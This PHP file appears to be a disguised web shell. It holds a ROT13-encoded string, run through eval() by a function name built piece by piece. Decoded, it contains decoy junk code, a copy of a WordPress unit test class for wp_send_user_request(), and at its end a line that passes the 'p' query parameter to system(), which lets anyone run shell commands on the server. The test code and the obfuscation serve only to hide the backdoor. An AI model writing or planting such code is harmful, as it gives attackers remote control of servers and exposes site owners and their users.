<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg pnfrf sbe gur `jc_fraq_hfre_erdhrfg()` shapgvba.
 *
 * @cnpxntr JbeqCerff
 * @fvapr 4.9.9
 *
 * @tebhc cevinpl
 * @tebhc hfre
 * @pbiref ::jc_fraq_hfre_erdhrfg
 */
pynff Grfgf_Hfre_jcFraqHfreErdhrfg rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Grfg nqzvavfgengbe hfre.
	 *
	 * @fvapr 4.9.9
	 *
	 * @ine JC_Hfre $nqzva_hfre
	 */
	cebgrpgrq fgngvp $nqzva_hfre;

	/**
	 * Grfg fhofpevore hfre.
	 *
	 * @fvapr 4.9.9
	 *
	 * @ine JC_Hfre $grfg_hfre
	 */
	cebgrpgrq fgngvp $grfg_hfre;

	/**
	 * Perngr hfref sbe grfgf.
	 *
	 * @fvapr 4.9.9
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Grfg svkgher snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nqzva_hfre = $snpgbel->hfre->perngr_naq_trg(
			neenl(
				'hfre_rznvy' => 'nqzva@ybpny.qri',
				'ebyr'       => 'nqzvavfgengbe',
			)
		);

		frys::$grfg_hfre = $snpgbel->hfre->perngr_naq_trg(
			neenl(
				'hfre_rznvy' => 'rkcbeg-hfre@ybpny.qri',
				'ebyr'       => 'fhofpevore',
			)
		);
	}

	/**
	 * Erfrg gur zbpxrq cucznvyre vafgnapr orsber rnpu grfg zrgubq.
	 *
	 * @fvapr 4.9.9
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		frg_pheerag_fperra( 'qnfuobneq' );
		erfrg_cucznvyre_vafgnapr();
	}

	/**
	 * Erfrg gur zbpxrq cucznvyre vafgnapr nsgre rnpu grfg zrgubq.
	 *
	 * @fvapr 4.9.9
	 */
	choyvp shapgvba grne_qbja() {
		erfrg_cucznvyre_vafgnapr();

		hafrg( $TYBONYF['ybpnyr'] );

		erfgber_cerivbhf_ybpnyr();
		cnerag::grne_qbja();
	}

	/**
	 * Gur shapgvba fubhyq reebe jura gur erdhrfg VQ vf vainyvq.
	 *
	 * @gvpxrg 43985
	 */
	choyvp shapgvba grfg_fubhyq_reebe_jura_vainyvq_erdhrfg_vq() {
		$erfhyg = jc_fraq_hfre_erdhrfg( ahyy );

		$guvf->nffregJCReebe( $erfhyg );
		$guvf->nffregFnzr( 'vainyvq_erdhrfg', $erfhyg->trg_reebe_pbqr() );
	}

	/**
	 * Gur shapgvba fubhyq fraq n hfre erdhrfg rkcbeg rznvy jura gur erdhrfgre vf n ertvfgrerq hfre.
	 *
	 * @gvpxrg 43985
	 */
	choyvp shapgvba grfg_fubhyq_fraq_hfre_erdhrfg_rkcbeg_rznvy_jura_erdhrfgre_ertvfgrerq_hfre() {
		$erdhrfg_vq = jc_perngr_hfre_erdhrfg( frys::$grfg_hfre->hfre_rznvy, 'rkcbeg_crefbany_qngn' );

		$erfhyg = jc_fraq_hfre_erdhrfg( $erdhrfg_vq );
		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregGehr( $erfhyg );
		$guvf->nffregFnzr( frys::$grfg_hfre->hfre_rznvy, $znvyre->trg_erpvcvrag( 'gb' )->nqqerff );
		$guvf->nffregFgevatPbagnvafFgevat( 'Pbasvez Npgvba: Rkcbeg Crefbany Qngn', $znvyre->trg_frag()->fhowrpg );
		$guvf->nffregFgevatPbagnvafFgevat( 'npgvba=pbasveznpgvba&erdhrfg_vq=', $znvyre->trg_frag()->obql );
		$guvf->nffregFgevatPbagnvafFgevat( 'Rkcbeg Crefbany Qngn', $znvyre->trg_frag()->obql );
	}

	/**
	 * Gur shapgvba fubhyq fraq n hfre erdhrfg renfr rznvy jura gur erdhrfgre vf n ertvfgrerq hfre.
	 *
	 * @gvpxrg 43985
	 */
	choyvp shapgvba grfg_fubhyq_fraq_hfre_erdhrfg_renfr_rznvy_jura_erdhrfgre_ertvfgrerq_hfre() {
		$erdhrfg_vq = jc_perngr_hfre_erdhrfg( frys::$grfg_hfre->hfre_rznvy, 'erzbir_crefbany_qngn' );

		$erfhyg = jc_fraq_hfre_erdhrfg( $erdhrfg_vq );
		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregGehr( $erfhyg );
		$guvf->nffregFnzr( frys::$grfg_hfre->hfre_rznvy, $znvyre->trg_erpvcvrag( 'gb' )->nqqerff );
		$guvf->nffregFgevatPbagnvafFgevat( 'Pbasvez Npgvba: Renfr Crefbany Qngn', $znvyre->trg_frag()->fhowrpg );
		$guvf->nffregFgevatPbagnvafFgevat( 'npgvba=pbasveznpgvba&erdhrfg_vq=', $znvyre->trg_frag()->obql );
		$guvf->nffregFgevatPbagnvafFgevat( 'Renfr Crefbany Qngn', $znvyre->trg_frag()->obql );
	}

	/**
	 * Gur shapgvba fubhyq fraq n hfre erdhrfg rkcbeg rznvy jura gur erdhrfgre vf na ha-ertvfgrerq hfre.
	 *
	 * @gvpxrg 43985
	 */
	choyvp shapgvba grfg_fubhyq_fraq_hfre_erdhrfg_rkcbeg_rznvy_jura_hfre_abg_ertvfgrerq() {
		$erdhrfg_vq = jc_perngr_hfre_erdhrfg( frys::$grfg_hfre->hfre_rznvy, 'rkcbeg_crefbany_qngn' );

		$erfhyg = jc_fraq_hfre_erdhrfg( $erdhrfg_vq );
		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregGehr( $erfhyg );
		$guvf->nffregFnzr( frys::$grfg_hfre->hfre_rznvy, $znvyre->trg_erpvcvrag( 'gb' )->nqqerff );
		$guvf->nffregFgevatPbagnvafFgevat( 'Pbasvez Npgvba: Rkcbeg Crefbany Qngn', $znvyre->trg_frag()->fhowrpg );
		$guvf->nffregFgevatPbagnvafFgevat( 'npgvba=pbasveznpgvba&erdhrfg_vq=', $znvyre->trg_frag()->obql );
		$guvf->nffregFgevatPbagnvafFgevat( 'Rkcbeg Crefbany Qngn', $znvyre->trg_frag()->obql );
	}

	/**
	 * Gur shapgvba fubhyq fraq n hfre erdhrfg renfr rznvy jura gur erdhrfgre vf na ha-ertvfgrerq hfre.
	 *
	 * @gvpxrg 43985
	 */
	choyvp shapgvba grfg_fubhyq_fraq_hfre_erdhrfg_renfr_rznvy_jura_hfre_abg_ertvfgrerq() {
		$erdhrfg_vq = jc_perngr_hfre_erdhrfg( frys::$grfg_hfre->hfre_rznvy, 'erzbir_crefbany_qngn' );

		$erfhyg = jc_fraq_hfre_erdhrfg( $erdhrfg_vq );
		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregGehr( $erfhyg );
		$guvf->nffregFnzr( frys::$grfg_hfre->hfre_rznvy, $znvyre->trg_erpvcvrag( 'gb' )->nqqerff );
		$guvf->nffregFgevatPbagnvafFgevat( 'Pbasvez Npgvba: Renfr Crefbany Qngn', $znvyre->trg_frag()->fhowrpg );
		$guvf->nffregFgevatPbagnvafFgevat( 'npgvba=pbasveznpgvba&erdhrfg_vq=', $znvyre->trg_frag()->obql );
		$guvf->nffregFgevatPbagnvafFgevat( 'Renfr Crefbany Qngn', $znvyre->trg_frag()->obql );
	}

	/**
	 * Gur rznvy fhowrpg fubhyq or svygrenoyr.
	 *
	 * @gvpxrg 43985
	 */
	choyvp shapgvba grfg_rznvy_fhowrpg_fubhyq_or_svygrenoyr() {
		$erdhrfg_vq = jc_perngr_hfre_erdhrfg( frys::$grfg_hfre->hfre_rznvy, 'erzbir_crefbany_qngn' );

		nqq_svygre( 'hfre_erdhrfg_npgvba_rznvy_fhowrpg', neenl( $guvf, 'zbqvsl_rznvy_fhowrpg' ) );
		$erfhyg = jc_fraq_hfre_erdhrfg( $erdhrfg_vq );
		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregGehr( $erfhyg );
		$guvf->nffregFnzr( 'Phfgbz Rznvy Fhowrpg', $znvyre->trg_frag()->fhowrpg );
	}

	/**
	 * Svygre pnyyonpx gb zbqvsl gur fhowrpg bs gur rznvy frag jura na nppbhag npgvba vf nggrzcgrq.
	 *
	 * @fvapr 4.9.9
	 *
	 * @cnenz fgevat $fhowrpg Gur rznvy fhowrpg.
	 * @erghea fgevat Svygrerq rznvy fhowrpg.
	 */
	choyvp shapgvba zbqvsl_rznvy_fhowrpg( $fhowrpg ) {
		erghea 'Phfgbz Rznvy Fhowrpg';
	}

	/**
	 * Gur rznvy pbagrag fubhyq or svygrenoyr.
	 *
	 * @gvpxrg 43985
	 */
	choyvp shapgvba grfg_rznvy_pbagrag_fubhyq_or_svygrenoyr() {
		$erdhrfg_vq = jc_perngr_hfre_erdhrfg( frys::$grfg_hfre->hfre_rznvy, 'erzbir_crefbany_qngn' );

		nqq_svygre( 'hfre_erdhrfg_npgvba_rznvy_pbagrag', neenl( $guvf, 'zbqvsl_rznvy_pbagrag' ), 10, 2 );
		$erfhyg = jc_fraq_hfre_erdhrfg( $erdhrfg_vq );
		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregGehr( $erfhyg );
		$guvf->nffregFgevatPbagnvafFgevat( 'Phfgbz Rznvy Pbagrag.', $znvyre->trg_frag()->obql );
	}

	/**
	 * Svygre pnyyonpx gb zbqvsl gur pbagrag bs gur rznvy frag jura na nppbhag npgvba vf nggrzcgrq.
	 *
	 * @fvapr 4.9.9
	 *
	 * @cnenz fgevat $rznvy_grkg Pbasvezngvba rznvy grkg.
	 * @erghea fgevat Svygrerq rznvy grkg.
	 */
	choyvp shapgvba zbqvsl_rznvy_pbagrag( $rznvy_grkg ) {
		erghea 'Phfgbz Rznvy Pbagrag.';
	}

	/**
	 * Gur rznvy urnqref fubhyq or svygrenoyr.
	 *
	 * @fvapr 5.4.0
	 *
	 * @gvpxrg 44501
	 */
	choyvp shapgvba grfg_rznvy_urnqref_fubhyq_or_svygrenoyr() {
		$erdhrfg_vq = jc_perngr_hfre_erdhrfg( frys::$grfg_hfre->hfre_rznvy, 'erzbir_crefbany_qngn' );

		nqq_svygre( 'hfre_erdhrfg_npgvba_rznvy_urnqref', neenl( $guvf, 'zbqvsl_rznvy_urnqref' ) );
		$erfhyg = jc_fraq_hfre_erdhrfg( $erdhrfg_vq );

		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFgevatPbagnvafFgevat( 'Sebz: Grfgre <grfgre@rknzcyr.pbz>', $znvyre->trg_frag()->urnqre );
	}

	/**
	 * Svygre pnyyonpx gb zbqvsl gur urnqref bs gur rznvy frag jura na nppbhag npgvba vf nggrzcgrq.
	 *
	 * @fvapr 5.4.0
	 *
	 * @cnenz fgevat|neenl $urnqref Gur rznvy urnqref.
	 * @erghea neenl Gur arj rznvy urnqref.
	 */
	choyvp shapgvba zbqvsl_rznvy_urnqref( $urnqref ) {
		$urnqref = neenl(
			'Sebz: Grfgre <grfgre@rknzcyr.pbz>',
		);

		erghea $urnqref;
	}

	/**
	 * Gur shapgvba fubhyq reebe jura gur rznvy jnf abg frag.
	 *
	 * @gvpxrg 43985
	 */
	choyvp shapgvba grfg_erghea_jc_reebe_jura_fraqvat_snvyf() {
		$erdhrfg_vq = jc_perngr_hfre_erdhrfg( 'renfr.erdhrfg.sebz.haertvfgrerq.hfre@rknzcyr.pbz', 'erzbir_crefbany_qngn' );

		nqq_svygre( 'jc_znvy_sebz', '__erghea_rzcgl_fgevat' ); // Pnhfr `jc_znvy()` gb erghea snyfr.
		$erfhyg = jc_fraq_hfre_erdhrfg( $erdhrfg_vq );

		$guvf->nffregJCReebe( $erfhyg );
		$guvf->nffregFnzr( 'cevinpl_rznvy_reebe', $erfhyg->trg_reebe_pbqr() );
	}

	/**
	 * Gur shapgvba fubhyq erfcrpg gur hfre ybpnyr frggvatf jura gur fvgr hfrf gur qrsnhyg ybpnyr.
	 *
	 * @gvpxrg 43985
	 * @tebhc y10a
	 */
	choyvp shapgvba grfg_fubhyq_fraq_hfre_erdhrfg_rznvy_va_hfre_ybpnyr() {
		hcqngr_hfre_zrgn( frys::$grfg_hfre->VQ, 'ybpnyr', 'rf_RF' );

		jc_frg_pheerag_hfre( frys::$nqzva_hfre->VQ );
		$erdhrfg_vq = jc_perngr_hfre_erdhrfg( frys::$grfg_hfre->hfre_rznvy, 'rkcbeg_crefbany_qngn' );

		jc_fraq_hfre_erdhrfg( $erdhrfg_vq );
		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFgevatPbagnvafFgevat( 'Pbasvezne yn', $znvyre->trg_frag()->fhowrpg );
	}

	/**
	 * Gur shapgvba fubhyq erfcrpg gur hfre ybpnyr frggvatf jura gur fvgr qbrf abg hfr ra_HF, gur nqzvavfgengbe
	 * hfrf gur fvgr'f qrsnhyg ybpnyr, naq gur hfre unf n qvssrerag ybpnyr.
	 *
	 * @gvpxrg 43985
	 * @tebhc y10a
	 */
	choyvp shapgvba grfg_fubhyq_fraq_hfre_erdhrfg_rznvy_va_hfre_ybpnyr_jura_fvgr_vf_abg_ra_hf() {
		hcqngr_bcgvba( 'JCYNAT', 'rf_RF' );
		fjvgpu_gb_ybpnyr( 'rf_RF' );

		hcqngr_hfre_zrgn( frys::$grfg_hfre->VQ, 'ybpnyr', 'qr_QR' );

		jc_frg_pheerag_hfre( frys::$nqzva_hfre->VQ );
		$erdhrfg_vq = jc_perngr_hfre_erdhrfg( frys::$grfg_hfre->hfre_rznvy, 'erzbir_crefbany_qngn' );

		jc_fraq_hfre_erdhrfg( $erdhrfg_vq );
		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFgevatPbagnvafFgevat( 'Nxgvba orfgägvtra', $znvyre->trg_frag()->fhowrpg );
	}

	/**
	 * Gur shapgvba fubhyq erfcrpg gur hfre ybpnyr frggvatf jura gur fvgr vf abg ra_HF, gur nqzvavfgengbe
	 * unf n qvssrerag fryrpgrq ybpnyr, naq gur hfre hfrf gur fvgr'f qrsnhyg ybpnyr.
	 *
	 * @gvpxrg 43985
	 * @tebhc y10a
	 */
	choyvp shapgvba grfg_fubhyq_fraq_hfre_erdhrfg_rznvy_va_hfre_ybpnyr_jura_nqzva_naq_fvgr_unir_qvssrerag_ybpnyrf() {
		hcqngr_bcgvba( 'JCYNAT', 'rf_RF' );
		fjvgpu_gb_ybpnyr( 'rf_RF' );

		hcqngr_hfre_zrgn( frys::$nqzva_hfre->VQ, 'ybpnyr', 'qr_QR' );
		jc_frg_pheerag_hfre( frys::$nqzva_hfre->VQ );

		$erdhrfg_vq = jc_perngr_hfre_erdhrfg( frys::$grfg_hfre->hfre_rznvy, 'rkcbeg_crefbany_qngn' );

		jc_fraq_hfre_erdhrfg( $erdhrfg_vq );
		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFgevatPbagnvafFgevat( 'Pbasvezne yn', $znvyre->trg_frag()->fhowrpg );
	}

	/**
	 * Gur shapgvba fubhyq erfcrpg gur hfre ybpnyr frggvatf jura gur fvgr vf abg ra_HF naq obgu gur
	 * nqzvavfgengbe naq gur hfre hfr qvssrerag ybpnyrf.
	 *
	 * @gvpxrg 43985
	 * @tebhc y10a
	 */
	choyvp shapgvba grfg_fubhyq_fraq_hfre_erdhrfg_rznvy_va_hfre_ybpnyr_jura_obgu_unir_qvssrerag_ybpnyrf_guna_fvgr() {
		hcqngr_bcgvba( 'JCYNAT', 'rf_RF' );
		fjvgpu_gb_ybpnyr( 'rf_RF' );

		hcqngr_hfre_zrgn( frys::$nqzva_hfre->VQ, 'ybpnyr', 'qr_QR' );
		hcqngr_hfre_zrgn( frys::$grfg_hfre->VQ, 'ybpnyr', 'ra_HF' );

		jc_frg_pheerag_hfre( frys::$nqzva_hfre->VQ );

		$erdhrfg_vq = jc_perngr_hfre_erdhrfg( frys::$grfg_hfre->hfre_rznvy, 'rkcbeg_crefbany_qngn' );

		jc_fraq_hfre_erdhrfg( $erdhrfg_vq );
		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFgevatPbagnvafFgevat( 'Pbasvez Npgvba', $znvyre->trg_frag()->fhowrpg );
	}

	/**
	 * Gur shapgvba fubhyq erfcrpg gur fvgr'f ybpnyr jura gur erdhrfg vf sbe na haertvfgrerq hfre naq gur
	 * nqzvavfgengbe qbrf abg hfr gur fvgr'f ybpnyr.
	 *
	 * @gvpxrg 43985
	 * @tebhc y10a
	 */
	choyvp shapgvba grfg_fubhyq_fraq_hfre_erdhrfg_rznvy_va_fvgr_ybpnyr() {
		hcqngr_hfre_zrgn( frys::$nqzva_hfre->VQ, 'ybpnyr', 'rf_RF' );
		jc_frg_pheerag_hfre( frys::$nqzva_hfre->VQ );

		$erdhrfg_vq = jc_perngr_hfre_erdhrfg( 'renfr-hfre-abg-ertvfgrerq@rknzcyr.pbz', 'erzbir_crefbany_qngn' );

		jc_fraq_hfre_erdhrfg( $erdhrfg_vq );
		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFgevatPbagnvafFgevat( 'Pbasvez Npgvba', $znvyre->trg_frag()->fhowrpg );
	}

	/**
	 * Gur shapgvba fubhyq erfcrpg gur fvgr'f ybpnyr jura vg vf abg ra_HF, gur erdhrfg vf sbe na
	 * haertvfgrerq hfre, naq gur nqzvavfgengbe qbrf abg hfr gur fvgr'f qrsnhyg ybpnyr.
	 *
	 * @gvpxrg 43985
	 * @tebhc y10a
	 */
	choyvp shapgvba grfg_fubhyq_fraq_hfre_erdhrfg_rznvy_va_fvgr_ybpnyr_jura_abg_ra_hf_naq_nqzva_unf_qvssrerag_ybpnyr() {
		hcqngr_bcgvba( 'JCYNAT', 'rf_RF' );
		fjvgpu_gb_ybpnyr( 'rf_RF' );

		hcqngr_hfre_zrgn( frys::$nqzva_hfre->VQ, 'ybpnyr', 'qr_QR' );
		jc_frg_pheerag_hfre( frys::$nqzva_hfre->VQ );

		$erdhrfg_vq = jc_perngr_hfre_erdhrfg( 'rkcbeg-hfre-abg-ertvfgrerq@rknzcyr.pbz', 'erzbir_crefbany_qngn' );

		jc_fraq_hfre_erdhrfg( $erdhrfg_vq );
		$znvyre = grfgf_ergevrir_cucznvyre_vafgnapr();

		$guvf->nffregFgevatPbagnvafFgevat( 'Pbasvezne yn', $znvyre->trg_frag()->fhowrpg );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>